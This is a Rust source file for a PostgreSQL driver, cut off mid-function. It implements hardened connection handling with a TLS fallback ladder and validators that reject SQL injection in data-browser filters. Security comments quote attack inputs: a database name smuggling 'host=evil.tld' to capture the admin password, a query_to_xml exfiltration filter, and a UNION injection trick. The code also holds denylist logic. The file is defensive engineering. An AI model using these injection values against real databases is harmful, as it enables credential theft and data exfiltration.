// SPDX-FileCopyrightText: 2024-2026 Temps Contributors
// SPDX-License-Identifier: MIT OR Apache-2.0

//! PostgreSQL driver for temps-query
//!
//! Implements DataSource, Introspect, and Queryable traits for PostgreSQL.

use async_trait::async_trait;
use futures_util::{pin_mut, TryStreamExt};
use std::collections::HashMap;
use std::sync::Arc;
use temps_query::{
    BoundedRows, Capability, ContainerCapabilities, ContainerInfo, ContainerPath, ContainerType,
    DataError, DataSource, DatasetSchema, EntityCountHint, EntityInfo, FieldDef, FieldType,
    Introspect, QueryBudget, QueryOptions, QueryResult, QueryStats, Queryable, Result,
};
use tokio_postgres::{types::ToSql, Client, NoTls};
use tokio_postgres_rustls::MakeRustlsConnect;
use tracing::{debug, error, warn};

#[cfg(test)]
const FILTER_WHERE_PLACEHOLDER: &str = "status = 'active' AND created_at > '2025-01-01'";

/// Server-side ceiling for the introspection paths that take no `QueryOptions`
/// — `count` and the size/row-estimate lookups behind `get_entity_info`.
///
/// Those have no caller-supplied deadline to honour, but they are the paths a
/// prompt-injected agent can call in bulk (`get_entity_info` is in the read
/// allowlist), and `COUNT(*)` with a caller-supplied WHERE clause is a full
/// scan. Ten seconds is far more than an honest count needs and short enough
/// that a pile of them cannot hold the pool.
const DEFAULT_COUNT_TIMEOUT_MS: u64 = 10_000;
const MAX_QUERY_LIMIT: usize = 100;

/// Escape a SQL identifier by doubling any internal double-quote characters.
/// Prevents identifier injection when used inside `"..."` quoting.
fn escape_ident(name: &str) -> String {
    name.replace('"', "\"\"")
}

#[derive(Clone, Debug)]
struct PgQueryColumn {
    name: String,
    data_type: String,
    udt_kind: Option<String>,
}

fn pg_column_admission(column: &PgQueryColumn, row_budget: usize) -> Option<String> {
    let value = format!("__temps_source.\"{}\"", escape_ident(&column.name));
    let compression_aware_size = || {
        format!(
            "CASE WHEN {value} IS NULL THEN 4 WHEN PG_COLUMN_COMPRESSION({value}) IS NOT NULL \
             THEN {} ELSE PG_COLUMN_SIZE({value})::bigint * 8 + 64 END",
            row_budget.saturating_add(1)
        )
    };
    let expression = match column.data_type.as_str() {
        "character varying" | "character" | "text" | "xml" => {
            format!("COALESCE(OCTET_LENGTH({value})::bigint * 6 + 2, 4)")
        }
        "bytea" => format!("COALESCE(OCTET_LENGTH({value})::bigint * 2 + 8, 4)"),
        "json" => format!("COALESCE(OCTET_LENGTH({value}::text)::bigint * 6 + 8, 4)"),
        "jsonb" | "ARRAY" => compression_aware_size(),
        "boolean"
        | "smallint"
        | "integer"
        | "bigint"
        | "real"
        | "double precision"
        | "numeric"
        | "decimal"
        | "date"
        | "time without time zone"
        | "time with time zone"
        | "interval"
        | "timestamp without time zone"
        | "timestamp with time zone"
        | "uuid"
        | "money"
        | "inet"
        | "cidr"
        | "macaddr"
        | "macaddr8"
        | "bit"
        | "bit varying"
        | "oid"
        | "regclass"
        | "regtype"
        | "tsvector"
        | "tsquery"
        | "int4range"
        | "int8range"
        | "numrange"
        | "tsrange"
        | "tstzrange"
        | "daterange"
        | "int4multirange"
        | "int8multirange"
        | "nummultirange"
        | "tsmultirange"
        | "tstzmultirange"
        | "datemultirange" => {
            // Several apparently scalar PostgreSQL types are varlena and may
            // be TOAST-compressed (notably bit varying, ranges, tsvector, and
            // extension-backed domains). A compressed on-disk size is not a
            // safe upper bound for JSON expansion, so fail closed before
            // TO_JSONB just as we do for JSONB and arrays.
            compression_aware_size()
        }
        // PostgreSQL enum labels are limited to NAMEDATALEN (normally 63
        // bytes). Their JSON representation is therefore safely bounded
        // without invoking an arbitrary user-defined output function.
        "USER-DEFINED" if column.udt_kind.as_deref() == Some("e") => "386".to_string(),
        _ => return None,
    };
    Some(expression)
}

/// Admit rows from non-materializing per-column upper bounds. `TO_JSONB` is
/// located only in the admitted CASE arm, so rejected values are never encoded.
fn with_wire_row_budget(
    sql: &str,
    columns: &[PgQueryColumn],
    budget: QueryBudget,
) -> Result<String> {
    let admissions = columns
        .iter()
        .map(|column| pg_column_admission(column, budget.max_bytes))
        .collect::<Vec<_>>();
    // Preserve queryability when an extension defines an output type whose
    // expansion cannot be bounded safely. Only that field becomes JSON null;
    // supported fields in the same row remain available. The raw unsupported
    // value is never referenced by the projection, so PostgreSQL does not run
    // its arbitrary output function or detoast it for JSON conversion.
    let safe_source_sql = if columns.is_empty() {
        sql.to_string()
    } else {
        let projection = columns
            .iter()
            .zip(&admissions)
            .map(|(column, admission)| {
                let name = escape_ident(&column.name);
                if admission.is_some() {
                    format!("__temps_raw.\"{name}\" AS \"{name}\"")
                } else {
                    format!("NULL::text AS \"{name}\"")
                }
            })
            .collect::<Vec<_>>()
            .join(", ");
        format!("SELECT {projection} FROM ({sql}) AS __temps_raw")
    };
    let estimates = admissions
        .into_iter()
        .map(|admission| admission.unwrap_or_else(|| "4".to_string()))
        .collect::<Vec<_>>();
    let max_cell = if estimates.is_empty() {
        "0".to_string()
    } else {
        format!("GREATEST({})", estimates.join(", "))
    };
    let key_overhead = columns.iter().fold(2usize, |total, column| {
        total.saturating_add(column.name.len().saturating_mul(6).saturating_add(4))
    });
    let row_size = if estimates.is_empty() {
        key_overhead.to_string()
    } else {
        format!("{key_overhead} + {}", estimates.join(" + "))
    };

    Ok(format!(
        "SELECT CASE WHEN __temps_max_cell <= {} AND __temps_row_size <= {} \
             THEN TO_JSONB(__temps_source) ELSE NULL END AS __temps_row, \
             __temps_row_size AS __temps_size, __temps_max_cell \
         FROM ({safe_source_sql}) AS __temps_source \
         CROSS JOIN LATERAL (SELECT {row_size}::bigint AS __temps_row_size, \
             {max_cell}::bigint AS __temps_max_cell) AS __temps_admission",
        budget.max_cell_bytes, budget.max_bytes
    ))
}

/// A certificate verifier that accepts all server certificates (including self-signed).
///
/// SECURITY: this verifies nothing — with it, TLS gives encryption against a
/// passive observer and no protection at all against an active one, who can
/// present any certificate and receive this service's admin password. It exists
/// because Temps-managed PostgreSQL clusters are brought up with self-signed
/// certificates that no root store can validate.
///
/// It is therefore the *second* thing tried, not the first: [`connect_with_tls`]
/// attempts real verification against the webpki roots and only falls back here
/// when that fails, so any server presenting a properly-issued certificate —
/// every managed provider, anything reached over the public internet — is now
/// genuinely authenticated. Do not call this path directly.
#[derive(Debug)]
struct AcceptAllVerifier;

impl rustls::client::danger::ServerCertVerifier for AcceptAllVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::pki_types::CertificateDer<'_>,
        _intermediates: &[rustls::pki_types::CertificateDer<'_>],
        _server_name: &rustls::pki_types::ServerName<'_>,
        _ocsp_response: &[u8],
        _now: rustls::pki_types::UnixTime,
    ) -> std::result::Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::danger::ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &rustls::pki_types::CertificateDer<'_>,
        _dss: &rustls::DigitallySignedStruct,
    ) -> std::result::Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
        Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        rustls::crypto::ring::default_provider()
            .signature_verification_algorithms
            .supported_schemes()
    }
}

/// PostgreSQL data source implementation
pub struct PostgresSource {
    client: Arc<Client>,
    database_name: String,
    /// `statement_timeout` is session-scoped. Serialize the SET + query pair so
    /// concurrent row/count calls cannot inherit one another's timeout.
    query_timeout_lock: Arc<tokio::sync::Mutex<()>>,
}

/// True when `input` begins with `keyword` on a token boundary.
///
/// Free function so the shared structural checks below can use it without a
/// `PostgresSource`.
fn starts_with_sql_keyword(input: &str, keyword: &str) -> bool {
    let Some(rest) = input.trim_start().strip_prefix(keyword) else {
        return false;
    };

    match rest.chars().next() {
        None => true,
        Some(c) => !(c.is_ascii_alphanumeric() || c == '_' || c == '$' || !c.is_ascii()),
    }
}

impl PostgresSource {
    /// Raw SQL fragments cannot be safely validated with a denylist because
    /// PostgreSQL's parser remains the final authority. Accept only an absent
    /// or empty filter object until the API has a typed, parameterized DSL.
    fn validate_filters(filters: Option<&serde_json::Value>) -> Result<()> {
        match filters {
            None => Ok(()),
            Some(value) if value.as_object().is_some_and(|object| object.is_empty()) => Ok(()),
            Some(_) => Err(DataError::InvalidQuery(
                "PostgreSQL data browsing does not accept raw SQL filters".to_string(),
            )),
        }
    }

    fn clamp_limit(limit: Option<usize>) -> usize {
        limit.unwrap_or(MAX_QUERY_LIMIT).min(MAX_QUERY_LIMIT)
    }

    /// Reject a database name that isn't a plausible PostgreSQL identifier.
    ///
    /// The typed `Config` above already makes injection impossible; this
    /// exists so a malformed segment fails fast with a clear message instead
    /// of a confusing connection error, and so the same rule is enforced no
    /// matter how a future caller builds its connection.
    ///
    /// Deliberately permissive about non-ASCII (PostgreSQL allows UTF-8
    /// identifiers) while rejecting the characters that carry meaning in a
    /// libpq keyword/value string: whitespace, `=`, `'` and `\`.
    fn validate_database_identifier(name: &str) -> Result<()> {
        if name.is_empty() {
            return Err(DataError::InvalidQuery(
                "Database name cannot be empty".to_string(),
            ));
        }
        if name.len() > 63 {
            return Err(DataError::InvalidQuery(format!(
                "Database name is too long ({} bytes, max 63): {name}",
                name.len()
            )));
        }
        if let Some(bad) = name
            .chars()
            .find(|c| c.is_whitespace() || matches!(c, '=' | '\'' | '\\' | '\0'))
        {
            return Err(DataError::InvalidQuery(format!(
                "Database name contains an illegal character {bad:?}: {name}"
            )));
        }
        Ok(())
    }

    /// Create a new PostgreSQL data source
    pub async fn connect(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        database: &str,
    ) -> Result<Self> {
        Self::connect_with_policy(host, port, username, password, database, false).await
    }

    /// Create a PostgreSQL data source for a managed endpoint that must remain
    /// on the operator's private network.
    pub async fn connect_private(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        database: &str,
    ) -> Result<Self> {
        Self::connect_with_policy(host, port, username, password, database, true).await
    }

    async fn connect_with_policy(
        host: &str,
        port: u16,
        username: &str,
        password: &str,
        database: &str,
        private_only: bool,
    ) -> Result<Self> {
        // SECURITY: build the config with typed setters, never `format!`.
        //
        // This used to interpolate into a libpq keyword/value string:
        //
        //     format!("host={host} port={port} user={user} password={pw} dbname={db}")
        //
        // `database` is the first segment of a browser URL path, unvalidated,
        // and libpq strings are whitespace-separated key=value pairs where
        // `host` *appends* rather than replaces. So a path segment of
        // `nosuchdb host=evil.tld` produced a config listing a second host;
        // tokio-postgres tries hosts in order and falls through when the first
        // rejects the (nonexistent) database, handing the attacker-controlled
        // server this service's admin password in cleartext — worse here
        // because the TLS verifier accepts any certificate and there is a
        // plaintext fallback below.
        //
        // `Config` setters take values, not syntax, so no segment can inject a
        // parameter. The identifier check is belt-and-braces for the error
        // messages and to reject nonsense early.
        Self::validate_database_identifier(database)?;

        debug!(
            "Connecting to PostgreSQL: {}@{}:{}/{}",
            username, host, port, database
        );
        let client = if private_only {
            connect_with_private_tls_ladder(host, port, username, password, database).await?
        } else {
            connect_with_tls_ladder(host, port, username, password, database).await?
        };

        debug!(
            "Successfully connected to PostgreSQL database: {}",
            database
        );

        Ok(Self {
            client: Arc::new(client),
            database_name: database.to_string(),
            query_timeout_lock: Arc::new(tokio::sync::Mutex::new(())),
        })
    }

    /// Execute a raw SQL statement (no result rows expected).
    /// Used for DDL/admin operations like creating roles and granting privileges.
    pub async fn execute_raw(&self, sql: &str) -> Result<()> {
        self.client
            .batch_execute(sql)
            .await
            .map_err(|e| DataError::QueryFailed(format!("Execute failed: {}", e)))?;
        Ok(())
    }
}

/// Open a `tokio_postgres::Client` against a libpq-style connection string,
/// negotiating TLS with rustls + a verifier that accepts any server cert
/// (self-signed included). The spawned connection task is detached and
/// runs until the returned `Client` is dropped.
///
/// Public so probes (cluster health-checks, `pg_auto_failover` monitor
/// reads, etc.) outside this crate can reuse the same TLS posture without
/// re-implementing the verifier or wrestling with `MakeRustlsConnect`
/// directly.
/// Walk an error's `source()` chain and join messages with `: `.
/// `tokio_postgres::Error` displays only `"db error"` at the top level
/// — the actual reason (e.g. "password authentication failed",
/// "channel binding required") is one or two layers deeper.
fn format_chain<E: std::error::Error>(err: &E) -> String {
    let mut out = err.to_string();
    let mut cause: Option<&dyn std::error::Error> = err.source();
    while let Some(c) = cause {
        let s = c.to_string();
        if !s.is_empty() && !out.ends_with(&s) {
            out.push_str(": ");
            out.push_str(&s);
        }
        cause = c.source();
    }
    out
}

/// Reject subqueries and function-call syntax in an already string-stripped,
/// whitespace-normalised, lower-cased SQL fragment.
///
/// Shared by the PostgreSQL and MariaDB filter validators. It lives here, and
/// is called rather than copied, because the MariaDB backend previously kept a
/// hand-rolled variant that drifted: it looked only at the byte immediately
/// before `(` (so `sleep (5)` passed) and only checked `select` as a subquery
/// starter (so `IN (TABLE mysql.user)` passed on MySQL 8.0.19+). One
/// implementation, one set of tests, no drift.
pub fn reject_subqueries_and_function_calls(without_strings: &str) -> Result<()> {
    if without_strings.contains('(') {
        // PostgreSQL query expressions can start with SELECT, TABLE,
        // VALUES, or WITH. `IN (TABLE private_ids)` is a valid subquery and
        // must not be mistaken for a simple IN-list. Check every opening
        // parenthesis because query expressions can be nested in grouping
        // parentheses. Keyword boundaries avoid rejecting quoted columns
        // such as `"table"` or identifiers such as `selected_id`.
        const QUERY_EXPRESSION_STARTERS: [&str; 4] = ["select", "table", "values", "with"];
        let paren_starts_query_expression = without_strings.match_indices('(').any(|(idx, _)| {
            let after_paren = &without_strings[idx + 1..];
            QUERY_EXPRESSION_STARTERS
                .iter()
                .any(|keyword| starts_with_sql_keyword(after_paren, keyword))
        });
        if paren_starts_query_expression {
            return Err(DataError::InvalidQuery(
                "Subqueries are not allowed in the data browser".to_string(),
            ));
        }

        // Block function-call syntax. A keyword denylist cannot be complete:
        // data-returning functions such as query_to_xml/database_to_xml/
        // table_to_xml take their SQL payload as a *string literal*, which is
        // stripped before the denylist runs, so `1=1 AND query_to_xml('select
        // ... from users', true, false, '') IS NOT NULL` slips through and
        // exfiltrates other tables. Reject any identifier immediately
        // preceding `(` (i.e. a function call); only grouping parens and
        // `IN (...)`/`AND (...)`/`OR (...)`/`NOT (...)` are permitted. This
        // blocks explicit function-call syntax; PostgreSQL operators and
        // casts remain available to ordinary WHERE expressions.
        const PAREN_ALLOWED_PREFIXES: [&str; 4] = ["in", "and", "or", "not"];
        for (idx, _) in without_strings.match_indices('(') {
            let preceding = without_strings[..idx].trim_end();

            // A closing double quote immediately before `(` terminates a
            // quoted PostgreSQL identifier. A closing single quote can
            // occur here after string stripping when a Unicode-escaped
            // identifier uses PostgreSQL's optional `UESCAPE 'x'` clause.
            // Both forms are function calls. Do not allow quoted versions
            // of IN/AND/OR/NOT: quoted names are identifiers, never SQL
            // keywords.
            if matches!(preceding.chars().last(), Some('"' | '\'')) {
                return Err(DataError::InvalidQuery(
                    "Function calls are not allowed in the data browser".to_string(),
                ));
            }

            // PostgreSQL permits `$` and non-ASCII characters in unquoted
            // identifier continuations. Include them here so identifiers
            // such as `evil$function(...)` and `fünction(...)` cannot evade
            // the function-call check.
            let ident_rev: String = preceding
                .chars()
                .rev()
                .take_while(|c| {
                    c.is_ascii_alphanumeric() || *c == '_' || *c == '$' || !c.is_ascii()
                })
                .collect();
            let ident: String = ident_rev.chars().rev().collect();
            let before_ident = preceding[..preceding.len() - ident.len()].trim_end();
            let is_qualified = before_ident.ends_with('.');
            if !ident.is_empty()
                && (is_qualified || !PAREN_ALLOWED_PREFIXES.contains(&ident.as_str()))
            {
                return Err(DataError::InvalidQuery(
                    "Function calls are not allowed in the data browser".to_string(),
                ));
            }
        }
    }
    Ok(())
}

#[derive(Clone, Debug, Eq, PartialEq)]
enum ResolvedHost {
    UnixSocket(String),
    Tcp {
        hostname: String,
        addresses: Vec<std::net::IpAddr>,
    },
}

impl ResolvedHost {
    fn permits_unverified_transport(&self) -> bool {
        match self {
            Self::UnixSocket(_) => true,
            Self::Tcp { addresses, .. } => {
                !addresses.is_empty() && addresses.iter().all(|address| ip_is_private(*address))
            }
        }
    }
}

/// Resolve a PostgreSQL host exactly once for the whole TLS ladder.
///
/// The resulting addresses are installed in `Config::hostaddr`, so
/// tokio-postgres dials the addresses approved here instead of resolving the
/// hostname again after the private-network decision. The original hostname
/// remains in `Config::host` for certificate/SNI verification.
async fn resolve_host_once(host: &str, port: u16) -> Result<ResolvedHost> {
    let host = host.trim();
    if host.is_empty() {
        return Err(DataError::ConnectionFailed(
            "PostgreSQL host cannot be empty".to_string(),
        ));
    }

    if host.starts_with('/') {
        return Ok(ResolvedHost::UnixSocket(host.to_string()));
    }

    let hostname = host
        .strip_prefix('[')
        .and_then(|host| host.strip_suffix(']'))
        .unwrap_or(host)
        .to_string();
    let resolved = tokio::net::lookup_host((hostname.as_str(), port))
        .await
        .map_err(|error| {
            DataError::ConnectionFailed(format!(
                "Failed to resolve PostgreSQL host '{hostname}' on port {port}: {error}"
            ))
        })?;

    let mut addresses = Vec::new();
    for address in resolved {
        if !addresses.contains(&address.ip()) {
            addresses.push(address.ip());
        }
    }
    if addresses.is_empty() {
        return Err(DataError::ConnectionFailed(format!(
            "PostgreSQL host '{hostname}' resolved to no addresses"
        )));
    }

    Ok(ResolvedHost::Tcp {
        hostname,
        addresses,
    })
}

/// Build the connection config for a resolved host and a given SSL mode.
///
/// Each original hostname is paired with one pre-resolved `hostaddr`. This
/// preserves hostname-based certificate verification while preventing a
/// second DNS lookup from changing the address between authorization and use.
/// Named rather than inlined so security regression tests assert against the
/// production config instead of a hand-rolled copy.
fn connect_config_with_ssl_mode(
    resolved_host: &ResolvedHost,
    port: u16,
    username: &str,
    password: &str,
    database: &str,
    ssl_mode: tokio_postgres::config::SslMode,
) -> tokio_postgres::Config {
    let mut cfg = tokio_postgres::Config::new();
    match resolved_host {
        ResolvedHost::UnixSocket(path) => {
            cfg.host(path);
        }
        ResolvedHost::Tcp {
            hostname,
            addresses,
        } => {
            for address in addresses {
                cfg.host(hostname).hostaddr(*address);
            }
        }
    }
    cfg.port(port)
        .user(username)
        .password(password)
        .dbname(database)
        .ssl_mode(ssl_mode);
    cfg
}

/// The config the TLS ladder's first rung uses. Test-facing wrapper over
/// [`connect_config_with_ssl_mode`] so a test cannot accidentally assert
/// against a different SSL mode than production uses.
#[cfg(test)]
fn connect_config_for(
    resolved_host: &ResolvedHost,
    port: u16,
    username: &str,
    password: &str,
    database: &str,
) -> tokio_postgres::Config {
    connect_config_with_ssl_mode(
        resolved_host,
        port,
        username,
        password,
        database,
        tokio_postgres::config::SslMode::Require,
    )
}

/// Connect with the credential-safe PostgreSQL transport ladder.
///
/// The hostname is resolved once, then the exact approved addresses are used
/// for every rung: verified TLS, self-signed TLS, and (for private addresses
/// only) cleartext. This prevents DNS rebinding between the private-network
/// check and the credential-bearing connection.
pub async fn connect_with_tls_ladder(
    host: &str,
    port: u16,
    username: &str,
    password: &str,
    database: &str,
) -> Result<Client> {
    connect_with_tls_ladder_policy(
        host,
        port,
        username,
        password,
        database,
        TransportPolicy::VerifiedPublicAllowed,
    )
    .await
}

/// Connect to a managed PostgreSQL endpoint that must remain private even when
/// it presents a publicly trusted certificate.
///
/// Managed cluster credentials never need to leave the operator's own host or
/// mesh. Rejecting public addresses before the first TLS rung prevents stored
/// topology mistakes or forged control-plane data from turning verified TLS
/// into authorization to release those credentials.
pub async fn connect_with_private_tls_ladder(
    host: &str,
    port: u16,
    username: &str,
    password: &str,
    database: &str,
) -> Result<Client> {
    connect_with_tls_ladder_policy(
        host,
        port,
        username,
        password,
        database,
        TransportPolicy::PrivateOnly,
    )
    .await
}

#[derive(Copy, Clone, Debug, Eq, PartialEq)]
enum TransportPolicy {
    VerifiedPublicAllowed,
    PrivateOnly,
}

async fn connect_with_tls_ladder_policy(
    host: &str,
    port: u16,
    username: &str,
    password: &str,
    database: &str,
    policy: TransportPolicy,
) -> Result<Client> {
    let resolved_host = resolve_host_once(host, port).await?;
    if policy == TransportPolicy::PrivateOnly && !resolved_host.permits_unverified_transport() {
        return Err(DataError::ConnectionFailed(format!(
            "Managed PostgreSQL endpoint '{host}' resolved outside the private network; refusing \
             to send cluster credentials even over verified TLS"
        )));
    }
    let config = |ssl_mode| {
        connect_config_with_ssl_mode(&resolved_host, port, username, password, database, ssl_mode)
    };

    // SECURITY: every TLS rung must carry `SslMode::Require`.
    // tokio-postgres defaults to `Prefer`, which silently accepts a raw socket
    // when a server refuses TLS and would bypass the explicit downgrade gate.
    let tls_config = config(tokio_postgres::config::SslMode::Require);

    match connect_with_verified_tls(&tls_config).await {
        Ok(client) => {
            debug!(host = %host, "Connected to PostgreSQL with verified TLS");
            Ok(client)
        }
        Err(verified_error) => {
            // Both weaker rungs are restricted to the exact addresses resolved
            // above. The driver receives those same addresses through
            // `hostaddr`, so DNS cannot change the destination after this gate.
            if !resolved_host.permits_unverified_transport() {
                return Err(DataError::ConnectionFailed(format!(
                    "PostgreSQL at '{host}' did not present a certificate that validates \
                     against the system roots, and at least one resolved address is outside \
                     the private network. Refusing to fall back to an unverified certificate \
                     or to cleartext, because either would hand this service's password to \
                     whoever answered. Install a valid certificate, or reach the database over \
                     a private address or the Temps mesh. (error: {})",
                    format_chain(&verified_error),
                )));
            }

            match connect_with_self_signed_tls_config(&tls_config).await {
                Ok(client) => {
                    warn!(
                        host = %host,
                        "PostgreSQL certificate did not validate against the system roots ({}); \
                         connected with an unverified (self-signed) certificate. Traffic is \
                         encrypted but the server is NOT authenticated. Permitted only because \
                         every resolved address is loopback or private.",
                        format_chain(&verified_error)
                    );
                    Ok(client)
                }
                Err(tls_error) => {
                    warn!(
                        host = %host,
                        "PostgreSQL refused TLS ({}); falling back to an UNENCRYPTED connection. \
                         Permitted only because every resolved address is loopback or private.",
                        format_chain(&tls_error)
                    );

                    let plain_config = config(tokio_postgres::config::SslMode::Disable);
                    let (client, connection) =
                        plain_config.connect(NoTls).await.map_err(|error| {
                            DataError::ConnectionFailed(format!(
                                "PostgreSQL connection to '{host}:{port}/{database}' failed \
                             (TLS error: {}, plain error: {})",
                                format_chain(&tls_error),
                                format_chain(&error),
                            ))
                        })?;

                    tokio::spawn(async move {
                        if let Err(error) = connection.await {
                            error!("PostgreSQL connection error: {}", error);
                        }
                    });
                    Ok(client)
                }
            }
        }
    }
}

/// Whether `token` appears in `sql` as a whole SQL token.
///
/// Shared by the PostgreSQL and MariaDB denylists, which previously used a raw
/// `contains(" keyword ")`. Substring matching produced false *rejections* on
/// ordinary columns — `payload = 'x'` matched `"load "`, `charset = 'utf8'`
/// matched `"set "`, and any Postgres column literally named `commit`, `update`
/// or `copy` was unfilterable. That is not a cosmetic problem: a validator that
/// blocks legitimate queries is a validator someone eventually switches off.
///
/// Expects already-lowercased, whitespace-normalised, string-stripped input.
/// A token boundary is anything that cannot continue an identifier, matching
/// the rule `starts_with_sql_keyword` uses at the other end.
pub fn contains_sql_token(sql: &str, token: &str) -> bool {
    let is_ident_char =
        |c: char| c.is_ascii_alphanumeric() || c == '_' || c == '$' || !c.is_ascii();

    let mut from = 0;
    while let Some(found) = sql[from..].find(token) {
        let start = from + found;
        let end = start + token.len();

        // SECURITY: a numeric literal does not extend into the keyword after it.
        //
        // Digits are identifier *continuation* characters but cannot *start* an
        // identifier, so a run like `1e0` before `union` is a number and the
        // keyword after it is a separate token — which is exactly how MySQL's
        // and pre-15 PostgreSQL's lexers read `1e0union select ...`. Testing
        // only the single preceding character missed that, and because the old
        // `contains("union ")` form did catch it, switching to token matching
        // reopened a UNION injection. Walk the whole preceding identifier run
        // and treat it as a boundary when it cannot be an identifier at all.
        let mut preceding = sql[..start].chars().rev().take_while(|c| is_ident_char(*c));
        let before_ok = match preceding.next() {
            // Nothing identifier-ish before the token: a clean boundary.
            None => true,
            // Something is there. It is only a real identifier if the run's
            // FIRST character could start one; `preceding` is reversed, so the
            // run's first character is whatever it yields last.
            Some(nearest) => {
                let first = preceding.last().unwrap_or(nearest);
                first.is_ascii_digit()
            }
        };
        let after_ok = sql[end..].chars().next().is_none_or(|c| !is_ident_char(c));

        if before_ok && after_ok {
            return true;
        }
        from = start + token.len().max(1);
        if from >= sql.len() {
            break;
        }
    }
    false
}

/// Collapse every run of whitespace to a single ASCII space.
///
/// SQL lexers treat space, tab, newline, carriage return, form feed and
/// vertical tab identically, so any keyword denylist that matches
/// `"keyword "` must see normalised input or it can be stepped around with a
/// different separator. Shared by the Postgres and MariaDB validators.
pub fn normalize_sql_whitespace(sql: &str) -> String {
    let mut out = String::with_capacity(sql.len());
    let mut in_space = false;
    for ch in sql.chars() {
        if ch.is_whitespace() {
            if !in_space {
                out.push(' ');
                in_space = true;
            }
        } else {
            out.push(ch);
            in_space = false;
        }
    }
    out
}

pub async fn connect_with_self_signed_tls(
    config: &str,
) -> std::result::Result<Client, tokio_postgres::Error> {
    let parsed: tokio_postgres::Config = config.parse()?;
    connect_with_self_signed_tls_config(&parsed).await
}

/// As [`connect_with_self_signed_tls`], but takes an already-built
/// [`tokio_postgres::Config`].
///
/// Preferred whenever any component of the connection is caller-supplied: a
/// `Config` carries values, so nothing in it can be mistaken for connection
/// syntax the way an interpolated keyword/value string can.
/// Whether an address is one the operator's own machine or private network.
///
/// Split out from [`ResolvedHost::permits_unverified_transport`] so the classification itself is
/// synchronous and unit-testable without a resolver.
fn ip_is_private(ip: std::net::IpAddr) -> bool {
    match ip {
        std::net::IpAddr::V4(v4) => {
            v4.is_loopback()
                || v4.is_private()
                || v4.is_link_local()
                || v4.is_unspecified()
                // Carrier-grade NAT (100.64.0.0/10) — Tailscale and several
                // mesh VPNs hand out addresses here.
                || (v4.octets()[0] == 100 && (v4.octets()[1] & 0xc0) == 0x40)
        }
        std::net::IpAddr::V6(v6) => {
            v6.is_loopback()
                || v6.is_unspecified()
                // Unique local (fc00::/7) and link-local (fe80::/10).
                || (v6.segments()[0] & 0xfe00) == 0xfc00
                || (v6.segments()[0] & 0xffc0) == 0xfe80
                // IPv4-mapped: classify by the embedded v4 address rather than
                // treating ::ffff:8.8.8.8 as an opaque v6 address.
                || v6.to_ipv4_mapped().is_some_and(|v4| ip_is_private(v4.into()))
        }
    }
}

/// Open a client with genuine certificate verification against the webpki root
/// store.
///
/// This is the rung above [`connect_with_self_signed_tls_config`]: a server
/// presenting a properly-issued certificate is authenticated here, so an active
/// attacker on the path cannot substitute their own and collect the password.
/// Only when this fails does the caller drop to the accept-anything verifier
/// that Temps-managed self-signed clusters need.
async fn connect_with_verified_tls(
    config: &tokio_postgres::Config,
) -> std::result::Result<Client, tokio_postgres::Error> {
    let _ =
        rustls::crypto::CryptoProvider::install_default(rustls::crypto::ring::default_provider());

    let roots = rustls::RootCertStore {
        roots: webpki_roots::TLS_SERVER_ROOTS.to_vec(),
    };
    let rustls_config = rustls::ClientConfig::builder()
        .with_root_certificates(roots)
        .with_no_client_auth();

    let tls = MakeRustlsConnect::new(rustls_config);
    let (client, connection) = config.connect(tls).await?;

    tokio::spawn(async move {
        if let Err(e) = connection.await {
            error!("PostgreSQL TLS connection error: {}", e);
        }
    });

    Ok(client)
}

pub async fn connect_with_self_signed_tls_config(
    config: &tokio_postgres::Config,
) -> std::result::Result<Client, tokio_postgres::Error> {
    // `ClientConfig::builder()` panics when no process-wide CryptoProvider
    // is installed AND the rustls features can't auto-pick one (e.g. both
    // `aws-lc-rs` and `ring` enabled, or neither). The main binary
    // installs ring's provider during setup, but tests and short-lived
    // tools that exercise this code path without going through setup
    // would crash. Install lazily here — `install_default` returns Err if
    // a provider is already installed, which we deliberately ignore.
    let _ =
        rustls::crypto::CryptoProvider::install_default(rustls::crypto::ring::default_provider());

    let rustls_config = rustls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(AcceptAllVerifier))
        .with_no_client_auth();

    let tls = MakeRustlsConnect::new(rustls_config);
    let (client, connection) = config.connect(tls).await?;

    tokio::spawn(async move {
        if let Err(e) = connection.await {
            error!("PostgreSQL TLS connection error: {}", e);
        }
    });

    Ok(client)
}

impl PostgresSource {
    /// Above this many estimated rows, report the planner's estimate rather
    /// than running an exact `COUNT(*)`.
    ///
    /// `COUNT(*)` in PostgreSQL is a full heap scan — there is no maintained
    /// row counter — so opening a large table in the data browser used to
    /// block on a scan of the whole thing before a single row could render.
    /// Below the threshold the exact count is cheap and worth having; above
    /// it, nobody is reading "12,481,003" as an exact figure anyway.
    const EXACT_COUNT_MAX_ROWS: f32 = 50_000.0;

    /// Row count and on-disk size for a table, cheaply.
    ///
    /// `pg_class.reltuples` and `pg_total_relation_size` are both O(1) catalog
    /// lookups. `reltuples` is `-1` on a table that has never been analysed
    /// (PG14+) and `0` on older versions, in which case we fall through to the
    /// exact count rather than reporting a wrong number.
    ///
    /// Returns `(row_count, size_bytes)`; either may be `None` if the catalog
    /// lookup fails (e.g. insufficient privileges), which callers already
    /// render as "—" rather than as zero.
    async fn row_count_and_size(
        &self,
        schema_name: &str,
        entity_name: &str,
    ) -> (Option<usize>, Option<u64>) {
        self.row_count_and_size_with_timeout(schema_name, entity_name, DEFAULT_COUNT_TIMEOUT_MS)
            .await
    }

    async fn row_count_and_size_with_timeout(
        &self,
        schema_name: &str,
        entity_name: &str,
        timeout_ms: u64,
    ) -> (Option<usize>, Option<u64>) {
        let client = &self.client;
        let _timeout_guard = self.query_timeout_lock.lock().await;
        if let Err(error) = client
            .batch_execute(&format!("SET statement_timeout = {timeout_ms}"))
            .await
        {
